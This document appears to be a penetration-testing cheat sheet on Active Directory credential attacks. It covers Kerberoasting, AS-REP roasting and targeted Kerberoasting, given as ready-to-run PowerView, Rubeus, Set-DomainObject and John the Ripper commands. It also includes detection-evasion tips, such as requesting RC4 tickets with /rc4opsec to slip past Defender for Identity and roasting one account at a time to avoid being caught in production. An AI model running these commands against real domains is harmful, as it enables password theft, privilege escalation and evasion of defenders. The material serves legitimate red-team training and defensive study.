- All we need is valid domain user, no special privileges required. All we need is SPN should not be null and you must be normal domain user and it will provide you TGS. 
- Offline cracking of service account passwords.
- The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.
- Because (non-machine) service account passwords are not frequently changed, this has become a very popular attack!

- Find user accounts used as Service accounts
```
# ActiveDirectory module

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# PowerView
Get-DomainUser -SPN
```

- Use Rubeus to list Kerberoast stats
```
Rubeus.exe kerberoast /stats
```
- Use Rubeus to request a TGS
```
Rubeus.exe kerberoast /user:svcadmin /simple

# if AES is enable, requesting rc4 will be anomaly
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec 
```
- To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC
```
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
```
- Kerberoast all possible accounts (don't do it on prod environment you will get caught. Do it one user at a time)
```
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

- Crack ticket using John the Ripper
```
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```


## Priv Esc - Targeted Kerberoasting - AS-REPs
- If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.
- With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.
- Enumerating accounts with Kerberos Preauth disabled
```
# Using PowerView:
Get-DomainUser -PreauthNotRequired -Verbose

# Using ActiveDirectory module:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

- Force disable Kerberos Preauth:
```
- Let's enumerate the permissions for RDPUsers on ACLs using PowerView:
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose

Get-DomainUser -PreauthNotRequired -Verbose
```

- Request encrypted AS-REP for offline brute-force.
```
C:\AD\Tools\Rubeus.exe asreproast /user:VPN1user /outfile:C:\AD\Tools\asrephashes.txt
```
- We can use John The Ripper to brute-force the hashes offline
```
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
```

## Priv Esc - Targeted Kerberoasting - Set SPN
- With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).
- We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".
- For Example, Let's enumerate the permissions for RDPUsers on ACLs using PowerView:
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
- Using Powerview, see if the user already has a SPN:
```
Get-DomainUser -Identity supportuser | select serviceprincipalname
```
- Using ActiveDirectory module:
```
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```
- Set a SPN for the user (must be unique for the forest)
```
Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}

# Using ActiveDirectory module:

Set-ADUser -Identity support1user -ServicePrincipalNames @{Add=‘dcorp/whatever1'}
```
 - Kerberoast the user
```
Rubeus.exe kerberoast /outfile:targetedhashes.txt
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
```
